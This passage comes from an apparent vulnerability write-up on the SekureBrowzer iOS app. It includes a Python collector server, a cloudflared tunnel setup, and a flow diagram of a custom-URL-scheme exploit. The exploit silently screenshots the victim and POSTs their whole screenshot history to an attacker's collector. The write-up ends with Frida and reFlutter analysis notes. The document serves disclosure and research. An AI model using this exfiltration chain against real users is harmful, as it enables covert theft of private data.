            print(f"    Images: {img_count} screenshots extracted and saved")

        except Exception as e:
            print(f"[!] {self.client_address[0]} -> {self.path}  ERROR: {e}")
            print(f"    Raw data saved to: {json_path}")

        self.send_response(200)
        self._cors()
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, fmt, *args):
        pass  # quiet; we print our own structured lines above


if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8000
    print(f"[*] SekureBrowzer PoC collector listening on http://0.0.0.0:{port}/collect")    
    print(f"[*] Captured payloads will be saved under {CAPTURE_DIR}/")
    http.server.HTTPServer(("0.0.0.0", port), Handler).serve_forever()
```

```bash
$ python3 collector_server.py
[*] SekureBrowzer PoC collector listening on http://0.0.0.0:8000/collect
[*] Captured payloads will be saved under captured/ folder
```

Since the PoC testing didn't have a routable public host, `cloudflared tunnel` was used to expose the local collector to the iOS device: `cloudflared tunnel --url http://localhost:8000` yields a temporary HTTPS domain, e.g., `https://my-tunnel-domain.trycloudflare.com`. That domain was then substituted into both `exploit.html` (the `url=` parameter) and `exfil.html` (the collector endpoint), so the SekureBrowzer app could reach the attacker's pages and the pages could reach the collector from the device's network.

```bash
$ cloudflared tunnel -url http://localhost:8000
INF Requesting new quick Tunnel on trycloudflare.com...
INF +--------------------------------------------------------------------------------------------+
INF |  Your quick Tunnel has been created! Visit it at (it may take some time to be reachable):  |
INF |  https://my-tunnel-domain.trycloudflare.com                                 |
INF +--------------------------------------------------------------------------------------------+
...
```

### Zero Additional User Interaction

The attack is fully automatic after the victim opens the initial link, full screenshot history exfiltrated with **zero additional taps** after opening the initial link. 

The end-to-end flow:
```
https://my-tunnel-domain.trycloudflare.com/exploit.html (open in SekureBrowzer)
    │
    ▼
window.location = "sekurebrowzer://anyhost?url=https://my-tunnel-domain.trycloudflare.com/exfil.html&takeScreenshot=true"
    │
    ├── silently screenshot current page                                        (RC2)
    └── navigate WebView to exfil.html
            │
            ▼
exfil.html loads, auto-fires: window.location = "sekurebrowzer://anyhost?dbCommand=getAll"
            │
            ▼
_processDataCommand("getAll") executes:
    ├── StorageManager.getAllScreenshotsAsJson()  ──▶  exports all screenshots
    └── runJavaScript(inject into #stolen-data div)  ──▶  (RC3 + RC4)
            │
            ▼
page-side JS polls #stolen-data, reads JSON when populated
            │
            ▼
fetch POST to https://my-tunnel-domain.trycloudflare.com/collect
            │
            ▼
local collector: base64-decode images → write PNG/JPEG files
            │
            ▼
match device's full screenshot history
```

### PoC

```bash
# Terminal 1: Start collector server (start this first to avoid port conflict)
$ python3 collector_server.py 8000

# Terminal 2: Start tunnel (new terminal)
$ cloudflared tunnel --url http://localhost:8000
# Record new generated HTTPS domain from output

# Update new generated domain in exploit.html and exfil.html

# Open exploit.html in SekureBrowser via tunnel using new domain
# App automatically: screenshots → exfils → extracts images

# Terminal 1 output shows:
# [+] 127.0.0.1 -> /collect
#     JSON: captured/20260911T103522_12345.json
#     Images: 5 screenshots extracted and saved

# Verify images extracted:
$ ls -lh captured/*.png captured/*.jpg
```

![Exploitation PoC](https://lh3.googleusercontent.com/pw/AP1GczMuTndkEpv1_bh5sK6JpL11T-Ya-pfxbJ8GeL1G7IGNb72yD6KHV2dFH0-2VyTwCAFFHOMjfd3OBvUkA9RyOytLSPAsWoHswyETU0mRfvjqwmBCArw1qT0QtCTPbBTbGJmLh9AC3aTjOUWTRpnEWL2V=w1920-h1156-s-no-gm)
_**Figure: Exploitation PoC**_

## Conclusion

The whole vulnerable surface comes down to one decision: letting an unauthenticated, externally-triggerable custom URL scheme reach directly into a silent capture routine and a bulk-export-then-inject pipeline, with the same no-origin-check WebView JS sink handling everything from normal page navigation to dumping the local database. No jailbreak and no memory corruption were needed — every step above is static analysis plus two Frida hooks against normal, working Dart control flow. The one piece still resting on inference rather than a captured trace is the exact literal comparison `_processDataCommand` runs against `dbCommand`'s three branch values; everything upstream of that — the scheme check, the parameter extraction, the reachability of the export methods — is confirmed.

The Dart AOT layer made this a different exercise from a typical native iOS challenge: `strings` and library-id clustering got a fast working hypothesis, but confirming it needed reFlutter's instrumented snapshot dump to get real function symbols into IDA, then targeted Frida hooks on two runtime-only structures — the object pool (`X27`) and the dispatch table (`X21`) — to pull out the literal strings and resolved call targets that don't exist until the process is running. The remaining gap is a live trace of `-[WKWebView evaluateJavaScript:completionHandler:]` to catch the exact injected JS on a running instance; static analysis alone gets everything up to that point.